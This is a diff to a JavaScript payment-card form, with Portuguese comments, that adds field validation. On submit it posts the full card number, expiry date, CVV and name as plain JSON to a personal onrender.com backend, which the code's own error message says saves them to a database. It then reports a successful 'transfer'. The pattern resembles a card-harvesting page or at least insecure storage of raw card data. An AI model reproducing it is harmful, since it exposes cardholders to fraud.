@@ -8,7 +8,6 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: document.querySelector("#nome"),
     };
 
-    // --- LOGICA DAS DICAS (Mantida do seu original) ---
     const mensagensDica = {
         numero: "Exemplo: 1234 5678 9123 4567",
         data: "Exemplo: 12/30",
@@ -16,13 +15,23 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
+    // --- FUNÇÕES DE AJUDA (Dicas e Remoção de Erros) ---
     function removeMensagemDica(input) {
-        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
-        if (dicaExistente) {
-            dicaExistente.remove();
-        }
+        const existing = input.parentElement.querySelector(".mensagem-dica");
+        if (existing) existing.remove();
     }
 
+    function limparErros() {
+        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
+        for (const key in campos) {
+            campos[key].style.border = "1px solid #ccc"; // Volta a cor normal
+        }
+        document.querySelectorAll('input[name="gender"]').forEach(r => {
+            r.parentElement.style.border = "none";
+        });
+    }
+
+    // Eventos de Focus/Blur para as Dicas
     for (const key in campos) {
         const input = campos[key];
         input.addEventListener("focus", () => {
@@ -41,54 +50,99 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     }
 
-    // --- NOVA LOGICA DE ENVIO PARA O BANCO DE DADOS ---
+    // --- LOGICA DE ENVIO COM VALIDAÇÃO VISUAL ---
     form.addEventListener("submit", async (event) => {
-        event.preventDefault(); // Impede o recarregamento da página
+        event.preventDefault();
+        limparErros(); // Limpa avisos anteriores
 
-        // 1. Pegar o tipo de cartão selecionado
-        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
+        const inputsParaValidar = {
+            numero: campos.numero,
+            data: campos.data,
+            cvv: campos.cvv,
+            nome: campos.nome,
+            tipo: document.querySelector('input[name="gender"]:checked'),
+        };
 
-        // 2. Montar o objeto com os dados
+        const mensagensErro = {
+            numero: "Por favor, insira o número do cartão.",
+            data: "A data é necessária.",
+            cvv: "O CVV é necessário.",
+            nome: "Por favor, insira o nome impresso no cartão.",
+            tipo: "Selecione uma opção (Crédito ou Débito).",
+        };
+
+        let formValido = true;
+
+        // 1. VALIDAÇÃO VISUAL (Igual ao script antigo)
+        for (const key in inputsParaValidar) {
+            const input = inputsParaValidar[key];
+
+            if (!input || input.value.trim() === "") {
+                formValido = false;
+
+                if (key === "tipo") {
+                    const radios = document.querySelectorAll('input[name="gender"]');
+                    radios.forEach(r => {
+                        r.parentElement.style.border = "2px solid red"; // Retângulo vermelho
+                        r.parentElement.style.borderRadius = "8px";
+                    });
+                    const container = document.querySelector(".radio-container");
+                    const erro = document.createElement("span");
+                    erro.classList.add("mensagem-erro");
+                    erro.style.color = "red";
+                    erro.style.fontSize = "14px";
+                    erro.textContent = mensagensErro[key];
+                    container.appendChild(erro);
+                } else {
+                    input.style.border = "2px solid red"; // Retângulo vermelho no campo
+                    const erro = document.createElement("span");
+                    erro.classList.add("mensagem-erro");
+                    erro.style.color = "red";
+                    erro.style.fontSize = "14px";
+                    erro.style.display = "block";
+                    erro.style.marginTop = "4px";
+                    erro.textContent = mensagensErro[key];
+                    input.parentElement.appendChild(erro);
+                }
+            }
+        }
+
+        if (!formValido) return; // Para aqui se houver erro
+
+        // 2. ENVIO PARA O SERVIDOR (Se tudo estiver preenchido)
+        const botao = form.querySelector("button");
+        botao.disabled = true;
+        botao.textContent = "Processando...";
+
         const dadosParaEnviar = {
             numero: campos.numero.value,
             dataValidade: campos.data.value,
             cvv: campos.cvv.value,
             nome: campos.nome.value,
-            tipo: cardType
+            tipo: document.querySelector('input[name="gender"]:checked').value
         };
 
-        // 3. DESATIVAR O BOTÃO (Evita que o usuário clique 10 vezes enquanto envia)
-        const botao = form.querySelector("button");
-        botao.disabled = true;
-        botao.textContent = "Processando...";
-
         try {
-            // IMPORTANTE: Substitua o link abaixo pelo link que o RENDER te der!
-            // Exemplo: https://meu-projeto-api.onrender.com/enviar-dados
             const urlDoServidor = "https://backend-g2xn.onrender.com";
 
             const resposta = await fetch(urlDoServidor, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(dadosParaEnviar)
             });
 
             if (resposta.ok) {
-                alert("Transferência processada com sucesso!");
-                form.reset(); // Limpa o formulário
+                alert("Transferência realizada com sucesso!");
+                form.reset();
             } else {
-                alert("Erro ao processar transferência. Tente novamente.");
+                alert("Erro ao salvar no banco de dados.");
             }
         } catch (error) {
-            console.error("Erro na conexão:", error);
-            alert("O servidor está offline. Tente novamente em alguns instantes.");
+            console.error("Erro:", error);
+            alert("Servidor offline. Tente novamente em instantes.");
         } finally {
-            // Reativar o botão
             botao.disabled = false;
             botao.textContent = "Transferir";
         }
     });
 });
-
